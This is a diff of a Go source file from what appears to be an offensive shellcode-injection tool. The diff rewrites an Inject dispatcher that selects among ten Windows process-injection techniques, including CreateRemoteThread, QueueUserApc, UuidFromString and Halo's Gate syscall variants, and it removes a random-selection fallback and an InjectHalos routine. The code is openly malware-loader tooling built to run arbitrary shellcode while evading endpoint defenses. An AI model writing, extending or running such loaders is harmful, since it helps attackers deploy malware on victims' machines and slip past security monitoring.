@@ -1,85 +1,81 @@
 package core
 
 import (
-  "os"
-  "fmt"
+  "errors"
   "strings"
 )
 
-var techniques = []string{"CreateRemoteThread", "Fibers", "CreateProcess", "EarlyBirdApc", "UuidFromString"}
+var techniques []string = []string{"CreateRemoteThread","CreateRemoteThreadHalos","CreateProcess","EnumSystemLocales","EnumSystemLocalesHalos","Fibers","QueueUserApc","UuidFromString","EtwpCreateEtwThread","RtlCreateUserThread","1","2","3","4","5","6","7","8","9","10"}
 
 func Inject(shellcode []byte, technique string, pid int) (error) {
 
   // Check especified injection technique
-  if (strings.ToLower(technique) == "createremotethread") {
+  if (strings.ToLower(technique) == "createremotethread") || (strings.ToLower(technique) == "1") {
     err := CreateRemoteThread(shellcode, pid)
     if err != nil { // Handle error
       return err
     }
 
-  } else if (strings.ToLower(technique) == "fibers") {
-    err := Fibers(shellcode, pid)
+  } else if (strings.ToLower(technique) == "createremotethreadhalos") || (strings.ToLower(technique) == "2") {
+    err := CreateRemoteThreadHalos(shellcode)
     if err != nil { // Handle error
       return err
     }
 
-  } else if (strings.ToLower(technique) == "createprocess") {
+  } else if (strings.ToLower(technique) == "createprocess") || (strings.ToLower(technique) == "3") {
     err := CreateProcess(shellcode, pid)
     if err != nil { // Handle error
       return err
     }
 
-  } else if (strings.ToLower(technique) == "earlybirdapc") {
-    err := EarlyBirdApc(shellcode, pid)
+  } else if (strings.ToLower(technique) == "enumsystemlocales") || (strings.ToLower(technique) == "4") {
+    err := EnumSystemLocales(shellcode)
     if err != nil { // Handle error
       return err
     }
 
-  } else if (strings.ToLower(technique) == "uuidfromstring"){
-    err := UuidFromString(shellcode, pid)
+  } else if (strings.ToLower(technique) == "enumsystemlocaleshalos") || (strings.ToLower(technique) == "5") {
+    err := EnumSystemLocalesHalos(shellcode)
+    if err != nil { // Handle error
+      return err
+    }
+
+  } else if (strings.ToLower(technique) == "fibers") || (strings.ToLower(technique) == "6") {
+    err := Fibers(shellcode)
+    if err != nil { // Handle error
+      return err
+    }
+
+  } else if (strings.ToLower(technique) == "queueuserapc") || (strings.ToLower(technique) == "7") {
+    err := QueueUserApc(shellcode)
+    if err != nil { // Handle error
+      return err
+    }
+
+  } else if (strings.ToLower(technique) == "uuidfromstring") || (strings.ToLower(technique) == "8") {
+    err := UuidFromString(shellcode)
+    if err != nil { // Handle error
+      return err
+    }
+
+  } else if (strings.ToLower(technique) == "etwpcreateetwthread") || (strings.ToLower(technique) == "9") {
+    err := EtwpCreateEtwThread(shellcode)
+    if err != nil { // Handle error
+      return err
+    }
+
+  } else if (strings.ToLower(technique) == "rtlcreateuserthread") || (strings.ToLower(technique) == "10") {
+    err := RtlCreateUserThread(shellcode, pid)
     if err != nil {
       return err
     }
 
   } else {
-    rand_n := RandomInt(4, 0) // Choose a random technique
-    fmt.Println("[*] Injecting shellcode using " + techniques[rand_n] + " function")
-    err := Inject(shellcode, techniques[rand_n], pid)
-    if err != nil { // Handle error
-      return err
-    }
+    return errors.New("invalid shellcode injection technique!")
   }
 
   return nil
 }
 
-func InjectHalos(shellcode []byte, technique string, pid int) (error) {
-  if (strings.ToLower(technique) == "createprocess") {
-    err := CreateProcessHalos(shellcode, pid)
-    if err != nil {
-      return err
-    }
-
-  } else if (strings.ToLower(technique) == "createremotethread") {
-    err := CreateRemoteThreadHalos(shellcode, pid)
-    if err != nil {
-      return err
-    }
-
-  } else if (strings.ToLower(technique) == "earlybirdapc") || (strings.ToLower(technique) == "uuidfromstring") || (strings.ToLower(technique) == "fibers") {
-    fmt.Println("[-] Injection technique not supported with Hell's Gate + Halo's Gate")
-    os.Exit(0)
-
-  } else {
-    rand_n := RandomInt(4, 0)
-    fmt.Println("[*] Injecting shellcode using " + techniques[rand_n] + " function")
-    err := InjectHalos(shellcode, techniques[rand_n], pid)
-    if err != nil {
-      return err
-    }
-  }
-
-  return nil
-}
 
 
